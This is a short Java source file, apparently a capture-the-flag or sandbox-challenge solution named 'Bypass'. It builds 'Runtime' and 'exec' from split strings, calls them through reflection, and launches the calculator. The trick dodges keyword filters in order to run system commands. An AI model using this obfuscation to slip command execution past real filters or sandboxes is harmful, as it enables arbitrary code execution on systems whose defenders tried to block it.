package solution;

import java.lang.reflect.Method;

public class Bypass {
    public static void bypass() throws Exception {
        java.lang.Class<?> run = java.lang.Class.forName("java.lang.Run" + "time");java.lang.reflect.Method getr = run.getMethod("getRun"+"time");java.lang.reflect.Method ex = run.getMethod("exe" + "c", String.class);ex.invoke(getr.invoke(null), "calc");
    }

    public static void main(String[] args) throws Exception {
        bypass();
    }
}
